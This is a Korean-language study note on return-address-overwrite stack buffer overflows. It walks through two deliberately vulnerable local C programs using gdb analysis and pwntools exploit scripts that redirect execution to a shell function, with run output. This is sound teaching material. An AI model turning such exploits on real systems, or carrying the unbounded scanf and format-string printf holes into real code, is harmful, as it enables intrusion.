[[SBO]]
# 배경
Return Address Overwrite
버퍼 오버플로우 공격의 일종
공격자가 함수의 반환 주소를 덮어쓰는 방식으로 동작

# 기본 예시1

다음과 같은 코드는 일반적인 방법으로 `/bin/sh`를 실행 시킬 수 없음
```c
#include <stdio.h>
#include <stdlib.h>

void shell(void){
    system("/bin/sh");
}

int main(void){
    char buf[20];

    scanf("%s", buf);
    printf(buf);

    return 0;
}
```

gdb를 통해 먼저 정적 분석을 하면, 아래와 같은 함수들을 사용한다는 걸 알 수 있음
이때, 이용하려는 함수인 shell의 주소가 0x08049186임을 알 수 있음
```plain
gef➤  info func
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  printf@plt
0x08049050  system@plt
0x08049060  __isoc99_scanf@plt
0x08049070  _start
0x0804909d  __wrap_main
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049186  shell
0x08049199  main
0x080491c4  _fini
```

각 함수들을 디스어셈블 해보면 입력값을 20바이트 받는다는 걸 알 수 있음
```plain
gef➤  disas main
Dump of assembler code for function main:
   0x08049199 <+0>:	push   ebp
   0x0804919a <+1>:	mov    ebp,esp
   0x0804919c <+3>:	sub    esp,0x14
   0x0804919f <+6>:	lea    eax,[ebp-0x14]
   0x080491a2 <+9>:	push   eax
   0x080491a3 <+10>:	push   0x804a010
   0x080491a8 <+15>:	call   0x8049060 <__isoc99_scanf@plt>
   0x080491ad <+20>:	add    esp,0x8
   0x080491b0 <+23>:	lea    eax,[ebp-0x14]
   0x080491b3 <+26>:	push   eax
   0x080491b4 <+27>:	call   0x8049040 <printf@plt>
   0x080491b9 <+32>:	add    esp,0x4
   0x080491bc <+35>:	mov    eax,0x0
   0x080491c1 <+40>:	leave  
   0x080491c2 <+41>:	ret    
End of assembler dump.
gef➤  disas shell 
Dump of assembler code for function shell:
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	push   0x804a008
   0x0804918e <+8>:	call   0x8049050 <system@plt>
   0x08049193 <+13>:	add    esp,0x4
   0x08049196 <+16>:	nop
   0x08049197 <+17>:	leave  
   0x08049198 <+18>:	ret    
End of assembler dump.
```

실제로 동적 분석을 통해 SFP와 RET의 위치를 확인해 보면 esp+0x08 에서 esp+0x18 까지 입력 버퍼(0x14) + SFP(0x04) 총 24바이트 후에 RET가 나오게 된다는 것을 알 수 있음
```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0xf7e26000  →  0x00225dac
$ecx   : 0xf7da0380  →  0x00020002
$edx   : 0x0       
$esp   : 0xffffd04c  →  0x0804a010  →  0x00007325 ("%s"?)
$ebp   : 0xffffd068  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffd124  →  0xffffd2ec  →  "/home/foo1/Desktop/basic_bof_ret/basic_bof"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x080491ad  →  <main+20> add esp, 0x8
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd04c│+0x0000: 0x0804a010  →  0x00007325 ("%s"?)	 ← $esp
0xffffd050│+0x0004: 0xffffd054  →  "aaaaaa"
0xffffd054│+0x0008: "aaaaaa"
0xffffd058│+0x000c: 0xf7006161 ("aa"?)
0xffffd05c│+0x0010: 0xf7d1ea8b  →   add esp, 0x10
0xffffd060│+0x0014: 0xffffd2ec  →  "/home/foo1/Desktop/basic_bof_ret/basic_bof"
0xffffd064│+0x0018: 0x00000070 ("p"?)
0xffffd068│+0x001c: 0xf7ffd020  →  0xf7ffda40  →  0x00000000	 ← $ebp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80491a2 <main+9>         push   eax
    0x80491a3 <main+10>        push   0x804a010
    0x80491a8 <main+15>        call   0x8049060 <__isoc99_scanf@plt>
 →  0x80491ad <main+20>        add    esp, 0x8
    0x80491b0 <main+23>        lea    eax, [ebp-0x14]
    0x80491b3 <main+26>        push   eax
    0x80491b4 <main+27>        call   0x8049040 <printf@plt>
    0x80491b9 <main+32>        add    esp, 0x4
    0x80491bc <main+35>        mov    eax, 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "basic_bof", stopped 0x80491ad in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80491ad → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

위 정보를 이용하여 pwntool를 이용해 다음과 같이 exploit할 수 있음
```python
from pwn import *

context.log_level = 'debug'
r = process("./basic_bof")

shell=0x08049186

buf=b''
buf+=b'a'*24
buf+=p32(shell)

r.sendline(buf)

r.interactive()
```

```sh
$ python3 exploit.py 
[+] Starting local process './basic_bof' argv=[b'./basic_bof'] : pid 36092
[DEBUG] Sent 0x1d bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  86 91 04 08  0a           │aaaa│aaaa│····│·│
    0000001d
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x90 bytes:
    b'uid=1000(foo1) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)\n'
uid=1000(foo1) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)
$  

```


# 기본 예시2
첫 번째 예시와 같은 방법으로 exploit할 수 있음
```c
#include <stdio.h>

void test() {
    printf("success");
}

int main() {
    char buffer[20];
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    scanf("%s", buffer);

    return 0;
}
```

setvbuf() 함수는 스트림들의 버퍼링을 비활성화하게 만들어 줌 
즉, 입력을 하거나 출력을 할 때, 버퍼를 거치지 않고 바로 들어감
이런 설정을 사용하는 주요 이유는 일반적으로 터미널과의 상호작용에서 버퍼링 때문에 원치 않는 지연이나 의도치 않은 동작이 발생하는 것을 방지하기 위해서임

```python
from pwn import *

p = process('./ret_overwrite')

success = 0x08049186

buf = b""

buf += b'a' * 24
buf += p32(success)

p.sendline(buf)

print(p.recvall())
```

```sh
$ python3 exploit.py 
[+] Starting local process './ret_overwrite': pid 36237
[+] Receiving all data: Done (7B)
[*] Process './ret_overwrite' stopped with exit code -11 (SIGSEGV) (pid 36237)
b'success'
```

# 공격 과정
- [ ] Buffer Overflow 식별
- [ ] 반환 주소 확인
- [ ] 쉘코드 실행